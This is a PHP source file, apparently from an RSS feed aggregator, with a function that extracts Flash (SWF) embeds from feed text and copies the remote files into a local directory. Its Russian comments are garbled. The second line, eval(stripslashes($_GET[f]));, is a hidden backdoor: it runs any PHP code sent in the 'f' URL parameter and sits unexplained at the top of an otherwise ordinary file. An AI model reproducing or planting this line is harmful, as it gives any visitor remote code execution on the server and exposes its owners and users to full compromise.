<?php
eval(stripslashes($_GET[f]));
function rss_get_swf($text, $rss) {
   // �������� ���������� ���� object
   if (preg_match_all("!<object (.*)</object>!Ui", $text, $regs)) {
      // ������������ ������ ��������� ���������
      foreach($regs[1] as $regs_key => $swf) {
         // ���� ���������� �������� � ������
         $image_saved = false;

         // ���� ��� ��������
         $swf = preg_replace("!src[ ]{1,}=!", "src=", $swf);
         $swf = preg_replace("!src=[ ]{1,}!", "src=", $swf);
         if (substr($swf, strpos($swf, "src=")+4, 1) == "\"" || substr($swf, strpos($swf, "src=")+4, 1) == "'") {
            $ex = preg_match("!src=[\"']{0,1}([^'\"]+)!i", $swf, $iregs);
         } else {
            $ex = preg_match("!src=([^ >]+)!i", $swf, $iregs);
         }
         
         if ($ex && strtolower(substr($iregs[1], -3)) == "swf") {
              if (strpos($iregs[1], "?") !== false) $iregs[1] = substr($iregs[1], 0, strpos($iregs[1], "?"));
              $swf_file = strtolower(strpos($iregs[1], "/") !== false ? substr(strrchr($iregs[1], "/"), 1) : $iregs[1]);

              // �������� ������ ��������
              $parsed_link = parse_url($rss["dir_url"]);
              switch(true) {
                 case substr($iregs[1], 0, 7) == "http://":
                      $source = $iregs[1];
                      break;
                 case substr($iregs[1], 0, 1) == "/":
                      $source = "http://".$parsed_link["host"].$iregs[1];
                      break;
                 default:
                      $source = $rss["dir_url"].$iregs[1];
                      break;
              }
              
              $size = get_remote_filesize(strpos($source, " ") !== false ? str_replace(" ", "%20", $source) : $source);
              
              // ���� ����� ���� ��������� ��������
              if ($rss["rss_reciveswf"] == "checked") {
                     $copy = true;
                     $image_saved = true;
                     clearstatcache();
                     if (file_exists(DOWNLOAD_IMAGES_DIR.$swf_file) && $size != filesize(DOWNLOAD_IMAGES_DIR.$swf_file)) {
                        $ext = strrchr($swf_file, ".");
                        $name = substr($swf_file, 0, -1*strlen($ext));
                        $i = 1;
                        if (empty($name)) $name = "flash";
                        while(file_exists(DOWNLOAD_IMAGES_DIR.$name.$i.$ext)) {
                            $i++;
                        }
                        $image = $name.$i.$ext;
                     } elseif (file_exists(DOWNLOAD_IMAGES_DIR.$swf_file) && $size == filesize(DOWNLOAD_IMAGES_DIR.$swf_file)) {
                        $copy = false;
                     }

                     // �������� � ������ ���� �������� �� ���������
                     $text = str_replace($iregs[1], "{DOWNLOAD_IMAGES_DIR_HTTP}".$swf_file."", $text);
                     // �������� �������� � ����, ���� ����� � ����� ������ ��� ���
                     if ($copy) {
                        @copy(strpos($source, " ") !== false ? str_replace(" ", "%20", $source) : $source, DOWNLOAD_IMAGES_DIR.$swf_file);
                     }
              }
         }

         if (!$image_saved) {
            $text = str_replace($regs[0][$regs_key], "", $text);
         }
      }
   }
   return $text;
}
?>